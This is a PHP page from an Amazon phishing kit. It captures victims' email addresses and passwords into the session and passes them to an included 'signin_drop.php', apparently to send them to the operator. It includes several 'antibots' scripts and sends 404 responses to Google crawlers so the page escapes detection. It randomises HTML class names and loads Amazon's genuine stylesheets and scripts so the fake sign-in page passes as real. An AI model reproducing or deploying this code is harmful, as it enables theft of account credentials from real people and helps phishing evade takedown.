<?php
session_start();
   error_reporting(0);
   include('../functions/get_lang_en.php');
    ########## Amazon Email & Password ########## 
   $_SESSION['_login_email_']    = $_POST['email'];
   $_SESSION['_login_password_'] = $_POST['password'];
   if(filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)){  
       include('signin_drop.php');
   }
        ########## End ########## 
    ########## Kill Bot Protection ########## 
   include "../../antibots/antibots1.php";
   include "../../antibots/antibots2.php";
   include "../../antibots/antibots3.php";
   include "../../../antibots/antibots4.php";
   include "../../antibots/antibots5.php";
   include "../../antibots/antibots6.php";
   if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        ########## End ########## 
   ?>
<!doctype html>
<html class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xx_TSM-x19c99z xx_Z118xDCxFort <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_FaZe-TEAM_x <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>" id="<?="x_".rand(4578, 3333)."ID-Z".rand(74548, 34637)?>"><head id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
      <meta charset="utf-8">
      <title><?=$I_01;?></title>
      <link rel="shortcut icon" type="image/x-icon" href="../data/icon/favicon.ico">
      <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/61gbb09bfIL._RC|11Fd9tJOdtL.css,21ULbzscqzL.css,31Q3id-QR0L.css,31QszevPBSL.css_.css#AUIClients/AmazonUI.min" type="text/css"/>
      <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/AuthenticationPortalAssets-60974eab2c51181b770605eaef55c2d69d69613c._V2_.css" type="text/css" />
      <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/CVFAssets-e91ba5c6e67c58c7f9c4c413fa67697feade389e._V2_.css" type="text/css" />
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
      <script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
      <script type="text/javascript">
         $(document).ready(function(){
             $("#formButton").click(function(){
                 $("#div1").toggle();
         		$("#div2").toggle();
             });
         });
      </script>		  
      <script>
         (function(f,h,I,ka){function u(a,b){r&&r.count&&r.count("aui:"+a,0===b?0:b||(r.count("aui:"+a)||0)+1)}function m(a){try{return a.test(navigator.userAgent)}catch(b){return!1}}function v(a,b,c){a.addEventListener?a.addEventListener(b,c,!1):a.attachEvent&&a.attachEvent("on"+b,c)}function q(a,b,c,e){b=b&&c?b+a+c:b||c;return e?q(a,b,e):b}function A(a,b,c){try{Object.defineProperty(a,b,{value:c,writable:!1})}catch(e){a[b]=c}return c}function J(){return setTimeout(U,0)}function la(a,b){var c=a.length,e=
         c,g=function(){e--||(K.push(b),L||(J(),L=!0))};for(g();c--;)V[a[c]]?g():(w[a[c]]=w[a[c]]||[]).push(g)}function ma(a,b,c,e,g){var d=h.createElement(a?"script":"link");v(d,"error",e);g&&v(d,"load",g);if(a){d.type="text/javascript";d.async=!0;if(a=c)a=-1!==b.indexOf("images/I")||/AUIClients/.test(b);a&&d.setAttribute("crossorigin","anonymous");d.src=b}else d.rel="stylesheet",d.href=b;h.getElementsByTagName("head")[0].appendChild(d)}function W(a,b){return function(c,e){function g(){ma(b,c,d,function(b){M?
         u("resource_unload"):d?(d=!1,u("resource_retry"),g()):(u("resource_error"),a.log("Asset failed to load: "+c));b&&b.stopPropagation?b.stopPropagation():f.event&&(f.event.cancelBubble=!0)},e)}if(X[c])return!1;X[c]=!0;u("resource_count");var d=!0;return!g()}}function na(a,b,c){for(var e={name:a,guard:function(c){return b.guardFatal(a,c)},logError:function(c,d,e){b.logError(c,d,e,a)}},g=[],d=0;d<c.length;d++)B.hasOwnProperty(c[d])&&(g[d]=N.hasOwnProperty(c[d])?N[c[d]](B[c[d]],e):B[c[d]]);return g}function x(a,
         b,c,e,g){return function(d,h){function l(){var a=null;e?a=h:"function"===typeof h&&(p.start=y(),a=h.apply(f,na(d,k,m)),p.end=y());if(b){B[d]=a;a=d;for(V[a]=!0;(w[a]||[]).length;)w[a].shift()();delete w[a]}p.done=!0}var k=g||this;"function"===typeof d&&(h=d,d=void 0);b&&(d=(d||"__NONAME__").replace(/^prv:/,""),O.hasOwnProperty(d)&&k.error(q(", reregistered by ",q(" by ",d+" already registered",O[d]),k.attribution),d),O[d]=k.attribution);for(var m=[],n=0;n<a.length;n++)m[n]=a[n].replace(/^prv:/,"");
         var p=Y[d||"anon"+ ++oa]={depend:m,registered:y(),namespace:k.namespace};c?l():la(m,k.guardFatal(d,l));return{decorate:function(a){N[d]=k.guardFatal(d,a)}}}}function Z(a){return function(){return{execute:x(arguments,!1,a,!1,this),register:x(arguments,!0,a,!1,this)}}}function aa(a){return function(b,c){c||(c=b,b=void 0);var e=this.attribution;return function(){C.push({attribution:e,name:b,logLevel:a});var g=c.apply(this,arguments);C.pop();return g}}}function D(a,b){this.load={js:W(this,!0),css:W(this)};
         A(this,"namespace",b);A(this,"attribution",a)}function ba(){h.body?n.trigger("a-bodyBegin"):setTimeout(ba,20)}function z(a,b){if(b){for(var c=a.className.split(" "),e=c.length;e--;)if(c[e]===b)return;a.className+=" "+b}}function ca(a,b){for(var c=a.className.split(" "),e=[],g;void 0!==(g=c.pop());)g&&g!==b&&e.push(g);a.className=e.join(" ")}function da(a){try{return a()}catch(b){return!1}}function E(){if(F){var a=f.innerWidth?{w:f.innerWidth,h:f.innerHeight}:{w:k.clientWidth,h:k.clientHeight};5<Math.abs(a.w-
         P.w)||50<a.h-P.h?(P=a,Q=4,(a=l.mobile||l.tablet?450<a.w&&a.w>a.h:1250<=a.w)?z(k,"a-ws"):ca(k,"a-ws")):Q--&&(ea=setTimeout(E,16))}}function pa(a){(F=void 0===a?!F:!!a)&&E()}function qa(){return F}"use strict";var G=I.now=I.now||function(){return+new I},y=function(a){return a&&a.now?a.now.bind(a):G}(f.performance);ka=y();var p=f.AmazonUIPageJS||f.P;if(p&&p.when&&p.register)throw Error("A copy of P has already been loaded on this page.");var r=f.ue;r&&r.tag&&(r.tag("aui"),r.tag("aui:aui_build_date:3.17.8.3-2018-06-19"));
         var K=[],L=!1,U;U=function(){for(var a=J(),b=G();K.length;)if(K.shift()(),50<G()-b)return;clearTimeout(a);L=!1};m(/OS 6_[0-9]+ like Mac OS X/i)&&v(f,"scroll",J);var V={},w={},X={},M=!1;v(f,"beforeunload",function(){M=!0;setTimeout(function(){M=!1},1E4)});var O={},B={},N={},Y={},oa=0,R,C=[],fa=f.onerror;f.onerror=function(a,b,c,e,g){g&&"object"===typeof g||(g=Error(a,b,c),g.columnNumber=e,g.stack=b||c||e?q(String.fromCharCode(92),g.message,"at "+q(":",b,c,e)):void 0);var d=C.pop()||{};g.attribution=
         q(":",g.attribution||d.attribution,d.name);g.logLevel=d.logLevel;g.attribution&&console&&console.log&&console.log([g.logLevel||"ERROR",a,"thrown by",g.attribution].join(" "));C=[];fa&&(d=[].slice.call(arguments),d[4]=g,fa.apply(f,d))};D.prototype={logError:function(a,b,c,e){b={message:b,logLevel:c||"ERROR",attribution:q(":",this.attribution,e)};if(f.ueLogError)return f.ueLogError(a||b,a?b:null),!0;console&&console.error&&(console.log(b),console.error(a));return!1},error:function(a,b,c,e){a=Error(q(":",
         e,a,c));a.attribution=q(":",this.attribution,b);throw a;},guardError:aa(),guardFatal:aa("FATAL"),log:function(a,b,c){return this.logError(null,a,b,c)},declare:x([],!0,!0,!0),register:x([],!0),execute:x([]),AUI_BUILD_DATE:"3.17.8.3-2018-06-19",when:Z(),now:Z(!0),trigger:function(a,b,c){var e=G();this.declare(a,{data:b,pageElapsedTime:e-(f.aPageStart||NaN),triggerTime:e});c&&c.instrument&&R.when("prv:a-logTrigger").execute(function(b){b(a)})},handleTriggers:function(){this.log("handleTriggers deprecated")},
         attributeErrors:function(a){return new D(a)},_namespace:function(a,b){return new D(a,b)}};var n=A(f,"AmazonUIPageJS",new D);R=n._namespace("PageJS","AmazonUI");R.declare("prv:p-debug",Y);n.declare("p-recorder-events",[]);n.declare("p-recorder-stop",function(){});A(f,"P",n);ba();if(h.addEventListener){var ga;h.addEventListener("DOMContentLoaded",ga=function(){n.trigger("a-domready");h.removeEventListener("DOMContentLoaded",ga,!1)},!1)}var k=h.documentElement,S=function(){var a=["O","ms","Moz","Webkit"],
         b=h.createElement("div");return{testGradients:function(){b.style.cssText=("background-image:-webkit-gradient(linear,left top,right bottom,from(#9f9),to(white));background-image:"+a.join("linear-gradient(left top,#9f9, white);background-image:")).slice(0,-17);return-1<b.style.backgroundImage.indexOf("gradient")},test:function(c){var e=c.charAt(0).toUpperCase()+c.substr(1);c=(a.join(e+" ")+e+" "+c).split(" ");for(e=c.length;e--;)if(""===b.style[c[e]])return!0;return!1},testTransform3d:function(){var a=
         !1;f.matchMedia&&(a=f.matchMedia("(-webkit-transform-3d)").matches);return a}}}(),p=k.className,ha=/(^| )a-mobile( |$)/.test(p),ia=/(^| )a-tablet( |$)/.test(p),l={audio:function(){return!!h.createElement("audio").canPlayType},video:function(){return!!h.createElement("video").canPlayType},canvas:function(){return!!h.createElement("canvas").getContext},svg:function(){return!!h.createElementNS&&!!h.createElementNS("http://www.w3.org/2000/svg","svg").createSVGRect},offline:function(){return navigator.hasOwnProperty&&
         navigator.hasOwnProperty("onLine")&&navigator.onLine},dragDrop:function(){return"draggable"in h.createElement("span")},geolocation:function(){return!!navigator.geolocation},history:function(){return!(!f.history||!f.history.pushState)},webworker:function(){return!!f.Worker},autofocus:function(){return"autofocus"in h.createElement("input")},inputPlaceholder:function(){return"placeholder"in h.createElement("input")},textareaPlaceholder:function(){return"placeholder"in h.createElement("textarea")},localStorage:function(){return"localStorage"in
         f&&null!==f.localStorage},orientation:function(){return"orientation"in f},touch:function(){return"ontouchend"in h},gradients:function(){return S.testGradients()},hires:function(){var a=f.devicePixelRatio&&1.5<=f.devicePixelRatio||f.matchMedia&&f.matchMedia("(min-resolution:144dpi)").matches;u("hiRes"+(ha?"Mobile":ia?"Tablet":"Desktop"),a?1:0);return a},transform3d:function(){return S.testTransform3d()},touchScrolling:function(){return m(/Windowshop|android.([3-9]|[L-Z])|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|Chrome|Silk|Firefox|Trident.+?; Touch/i)},
         ios:function(){return m(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i)&&!m(/trident|Edge/i)},android:function(){return m(/android.([1-9]|[L-Z])/i)&&!m(/trident|Edge/i)},mobile:function(){return ha},tablet:function(){return ia}},t;for(t in l)l.hasOwnProperty(t)&&(l[t]=da(l[t]));for(var T="textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "),H=0;H<T.length;H++)l[T[H]]=da(function(){return S.test(T[H])});var F=!0,ea=0,P={w:0,h:0},Q=4;E();v(f,"resize",function(){clearTimeout(ea);
         Q=4;E()});var ja={getItem:function(a){try{return f.localStorage.getItem(a)}catch(b){}},setItem:function(a,b){try{return f.localStorage.setItem(a,b)}catch(c){}}};ca(k,"a-no-js");z(k,"a-js");!m(/OS [1-8](_[0-9]*)+ like Mac OS X/i)||f.navigator.standalone||m(/safari/i)||z(k,"a-ember");p=[];for(t in l)l.hasOwnProperty(t)&&l[t]&&p.push("a-"+t.replace(/([A-Z])/g,function(a){return"-"+a.toLowerCase()}));z(k,p.join(" "));k.setAttribute("data-aui-build-date","3.17.8.3-2018-06-19");n.register("p-detect",function(){return{capabilities:l,
         localStorage:l.localStorage&&ja,toggleResponsiveGrid:pa,responsiveGridEnabled:qa}});m(/UCBrowser/i)||l.localStorage&&z(k,ja.getItem("a-font-class"));n.declare("a-event-revised-handling",!1);n.declare("a-fix-event-off",!1);u("pagejs:pkgExecTime",y()-NaN)})(window,document,Date);
           (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/61tHvuwljLL._RC|11IYhapguOL.js,61Z-hR1QEiL.js,31pYyxAZJRL.js,31Qll8kfk9L.js,01N6xzIJxbL.js,516fQ5+zVmL.js,01rpauTep4L.js,31JzIBuTmgL.js,61uDiYnK9wL.js,01BBu+b9t0L.js_.js');
           (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/AuthenticationPortalAssets-3cbd67cb821687489829ed6a61d9e8b52e65d2e3._V2_.js');
           (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/AuthenticationPortalInlineAssets-662783336058590306af126b0eeae5125982f026._V2_.js');
           (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/G/01/AUIClients/CVFAssets-53acd8e88d87f09d7e0bebd849f2fa4b112e99c7._V2_.js');
      </script>
   </head>
   <?php include ('../backend_form/backend_login.php');?>
</html>